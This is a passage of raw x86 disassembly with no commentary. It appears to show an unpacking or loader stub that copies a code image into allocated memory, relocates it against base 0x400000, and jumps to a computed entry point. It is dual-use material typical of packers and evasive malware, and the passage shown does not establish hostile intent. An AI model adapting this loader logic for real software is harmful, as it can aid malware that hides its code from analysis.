  41b031:	add    edx,DWORD PTR [ebp-0x60]
  41b034:	push   edx
  41b035:	call   0x41add0
  41b03a:	add    esp,0xc
  41b03d:	mov    eax,DWORD PTR [ebp-0x1c]
  41b040:	add    eax,DWORD PTR [ebp-0x34]
  41b043:	add    eax,DWORD PTR [ebp-0x24]
  41b046:	mov    DWORD PTR [ebp-0x24],eax
  41b049:	mov    ecx,DWORD PTR [ebp-0x60]
  41b04c:	add    ecx,DWORD PTR [ebp-0x34]
  41b04f:	mov    DWORD PTR [ebp-0x60],ecx
  41b052:	mov    edx,DWORD PTR [ebp-0x6c]
  41b055:	sub    edx,DWORD PTR [ebp-0x70]
  41b058:	mov    DWORD PTR [ebp-0x6c],edx
  41b05b:	jmp    0x41b005
  41b05d:	mov    eax,DWORD PTR [ebp-0x64]
  41b060:	push   eax
  41b061:	mov    ecx,DWORD PTR [ebp-0x20]
  41b064:	push   ecx
  41b065:	call   0x41abd0
  41b06a:	add    esp,0x8
  41b06d:	mov    edx,DWORD PTR [ebp-0x38]
  41b070:	mov    eax,DWORD PTR [ebp-0x20]
  41b073:	mov    DWORD PTR [edx],eax
  41b075:	push   0x17000
  41b07a:	call   0x41aab0
  41b07f:	add    esp,0x4
  41b082:	mov    DWORD PTR [ebp-0xc],eax
  41b085:	push   0x15500
  41b08a:	mov    ecx,DWORD PTR [ebp-0x38]
  41b08d:	push   ecx
  41b08e:	mov    edx,DWORD PTR [ebp-0xc]
  41b091:	add    edx,0x200
  41b097:	push   edx
  41b098:	call   0x41add0
  41b09d:	add    esp,0xc
  41b0a0:	mov    eax,DWORD PTR [ebp-0xc]
  41b0a3:	sub    eax,0x400000
  41b0a8:	push   eax
  41b0a9:	mov    ecx,DWORD PTR [ebp-0xc]
  41b0ac:	push   ecx
  41b0ad:	mov    edx,DWORD PTR [ebp-0x20]
  41b0b0:	push   edx
  41b0b1:	call   0x41acc0
  41b0b6:	add    esp,0xc
  41b0b9:	mov    ecx,DWORD PTR ds:0x4012f8
  41b0bf:	jmp    0x41b0c2
  41b0c1:	ret    
  41b0c2:	mov    esp,ecx
  41b0c4:	pop    eax
  41b0c5:	mov    ecx,DWORD PTR [ebp-0xc]
  41b0c8:	add    ecx,0x15350
  41b0ce:	mov    DWORD PTR ds:0x4012fc,ecx
  41b0d4:	jmp    0x41b0d7
  41b0d6:	ret    
  41b0d7:	jmp    0x41b0e0
  41b0dc:	mov    esp,ebp
  41b0de:	pop    ebp
  41b0df:	ret    
  41b0e0:	push   ebp
  41b0e1:	mov    ebp,esp
  41b0e3:	mov    eax,ds:0x4012fc
  41b0e8:	pop    ecx
  41b0e9:	jmp    0x41b0eb
  41b0eb:	call   0x41b0f0
  41b0f0:	pop    ecx
  41b0f1:	jmp    eax
  41b0f3:	pop    ebp
  41b0f4:	ret    
  41b0f5:	jmp    DWORD PTR ds:0x401100
  41b0fb:	jmp    DWORD PTR ds:0x401104
  41b101:	jmp    DWORD PTR ds:0x401108
  41b107:	jmp    DWORD PTR ds:0x40110c
  41b10d:	jmp    DWORD PTR ds:0x401110
  41b113:	jmp    DWORD PTR ds:0x401114
  41b119:	jmp    DWORD PTR ds:0x401118
  41b11f:	jmp    DWORD PTR ds:0x401120
  41b125:	jmp    DWORD PTR ds:0x401128
